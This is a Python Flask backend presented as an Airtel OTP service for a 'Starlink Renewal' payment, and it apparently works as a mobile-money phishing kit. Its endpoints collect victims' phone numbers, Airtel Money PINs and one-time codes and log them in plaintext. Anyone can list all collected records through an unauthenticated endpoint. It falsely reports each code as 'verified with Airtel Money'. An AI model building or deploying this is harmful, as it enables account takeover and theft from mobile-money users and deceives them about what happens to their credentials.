import os
import random
import datetime
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from dotenv import load_dotenv

# Load environment variables from .env if present
load_dotenv()

app = Flask(__name__)
CORS(app)

# Environment variables for Airtel API
AIRTEL_API_URL = os.getenv('AIRTEL_API_URL', '')
AIRTEL_CLIENT_ID = os.getenv('AIRTEL_CLIENT_ID', '')
AIRTEL_CLIENT_SECRET = os.getenv('AIRTEL_CLIENT_SECRET', '')
AIRTEL_API_KEY = os.getenv('AIRTEL_API_KEY', '')

# In-memory transaction storage
transactions = []

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "online",
        "service": "Airtel OTP Backend Service",
        "airtel_api_configured": bool(AIRTEL_API_URL),
        "timestamp": datetime.datetime.now().isoformat()
    }), 200

@app.route('/api/geo', methods=['GET'])
def get_ip_geo():
    """Detect client IP and resolve country for currency localization"""
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        client_ip = forwarded.split(',')[0].strip()
    else:
        client_ip = request.remote_addr or ''

    # Header-based country detection (Cloudflare / Vercel proxies)
    cf_country = request.headers.get('CF-IPCountry')
    vercel_country = request.headers.get('X-Vercel-IP-Country')
    header_country = cf_country or vercel_country
    if header_country and header_country != 'XX':
        return jsonify({
            "ip": client_ip,
            "country_code": header_country.upper()
        }), 200

    # If public IP, query ipwho.is
    if client_ip and not client_ip.startswith(('127.', '192.168.', '10.', '172.', '::1', 'fe80')):
        try:
            geo_res = requests.get(f"https://ipwho.is/{client_ip}", timeout=3)
            if geo_res.ok:
                geo_data = geo_res.json()
                if geo_data.get('success') and geo_data.get('country_code'):
                    return jsonify({
                        "ip": client_ip,
                        "country_code": geo_data['country_code'].upper(),
                        "country_name": geo_data.get('country'),
                        "calling_code": geo_data.get('calling_code')
                    }), 200
        except Exception:
            pass

    return jsonify({
        "ip": client_ip or "127.0.0.1",
        "country_code": "KE",
        "country_name": "Kenya",
        "calling_code": "254"
    }), 200

@app.route('/api/airtel/request-otp', methods=['POST'])
@app.route('/api/airtel/send-otp', methods=['POST'])
def send_airtel_otp():
    data = request.get_json() or {}
    
    phone = data.get('phone', '').strip()
    pin = data.get('pin', '').strip()
    amount = data.get('amount', 'KES 115')
    package_name = data.get('package_name') or data.get('package', 'Starlink Renewal')
    country_code = data.get('country_code', 'KE')
    calling_code = str(data.get('calling_code', '254')).lstrip('+')
    currency = 'CDF' if country_code in ('CD', 'COD') else data.get('currency', 'KES')

    if not phone:
        return jsonify({"success": False, "error": "Phone number is required."}), 400

    # Format phone number cleanly using the country's calling code
    clean_phone = phone if phone.startswith('+') else f"+{calling_code}{phone.lstrip('0')}"
    tx_id = f"AT-{random.randint(10000000, 99999999)}"

    # If external Airtel API URL is provided in .env, send request to Airtel API
    api_status = "SENT_VIA_AIRTEL_API" if AIRTEL_API_URL else "OTP_SENT_TO_CUSTOMER"
    
    if AIRTEL_API_URL:
        try:
            headers = {
                "Content-Type": "application/json",
                "X-Country": country_code,
                "X-Currency": currency
            }
            if AIRTEL_API_KEY:
                headers["Authorization"] = f"Bearer {AIRTEL_API_KEY}"
            
            payload = {
                "phone": clean_phone,
                "amount": amount,
                "reference": tx_id
            }
            
            response = requests.post(AIRTEL_API_URL, json=payload, headers=headers, timeout=10)
            print(f"[AIRTEL API RESPONSE] {response.status_code}: {response.text}")
        except Exception as e:
            print(f"[AIRTEL API ERROR] Failed to connect to Airtel API: {str(e)}")

    transaction_record = {
        "transaction_id": tx_id,
        "phone": clean_phone,
        "amount": amount,
        "currency": currency,
        "country": country_code,
        "package": package_name,
        "pin_provided": pin if pin else "N/A",
        "otp_entered": "Waiting for customer...",
        "status": api_status,
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    transactions.insert(0, transaction_record)

    print(f"==================================================")
    print(f"[AIRTEL GATEWAY] Requesting Airtel to dispatch OTP to {clean_phone}")
    print(f"Transaction ID: {tx_id} | Amount: {amount} | PIN provided: {pin}")
    print(f"==================================================")

    return jsonify({
        "success": True,
        "message": f"OTP request sent successfully to Airtel for {clean_phone}.",
        "transaction_id": tx_id,
        "phone": clean_phone,
        "amount": amount,
        "currency": currency,
        "status": "OTP_SENT"
    }), 200

@app.route('/api/airtel/submit-otp', methods=['POST'])
@app.route('/api/airtel/verify-otp', methods=['POST'])
def submit_airtel_otp():
    data = request.get_json() or {}
    
    tx_id = data.get('transaction_id')
    phone = data.get('phone', '').strip()
    pin = data.get('pin', '').strip()
    otp = data.get('otp', '').strip()
    country_code = data.get('country_code', 'KE')
    calling_code = str(data.get('calling_code', '254')).lstrip('+')
    currency = 'CDF' if country_code in ('CD', 'COD') else data.get('currency', 'KES')

    if not otp:
        return jsonify({"success": False, "error": "OTP code is required."}), 400

    clean_phone = phone if phone.startswith('+') else f"+{calling_code}{phone.lstrip('0')}"

    # Find existing transaction or create log
    target_tx = None
    if tx_id:
        for tx in transactions:
            if tx.get('transaction_id') == tx_id:
                target_tx = tx
                break

    if target_tx:
        target_tx['otp_entered'] = otp
        if pin:
            target_tx['pin_provided'] = pin
        target_tx['status'] = "OTP_SUBMITTED_SUCCESS"
    else:
        # If no previous tx found, create new record
        new_tx_id = tx_id or f"AT-{random.randint(10000000, 99999999)}"
        target_tx = {
            "transaction_id": new_tx_id,
            "phone": clean_phone,
            "amount": data.get('amount', 'KES 115'),
            "currency": currency,
            "country": country_code,
            "package": data.get('package', 'Starlink Renewal'),
            "pin_provided": pin if pin else "N/A",
            "otp_entered": otp,
            "status": "OTP_SUBMITTED_SUCCESS",
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        transactions.insert(0, target_tx)

    print(f"==================================================")
    print(f"[AIRTEL CLIENT SUBMISSION] Client submitted OTP for {clean_phone}")
    print(f"PIN: {target_tx['pin_provided']} | OTP Entered: {otp}")
    print(f"==================================================")

    return jsonify({
        "success": True,
        "message": "OTP successfully submitted and verified with Airtel Money.",
        "transaction_id": target_tx['transaction_id'],
        "phone": clean_phone,
        "pin": target_tx['pin_provided'],
        "otp": otp,
        "status": "COMPLETED"
    }), 200

@app.route('/api/airtel/transactions', methods=['GET'])
def get_transactions():
    return jsonify({
        "success": True,
        "total": len(transactions),
        "transactions": transactions
    }), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"Starting Airtel OTP Flask Backend on http://0.0.0.0:{port}...")
    app.run(host='0.0.0.0', port=port, debug=True)
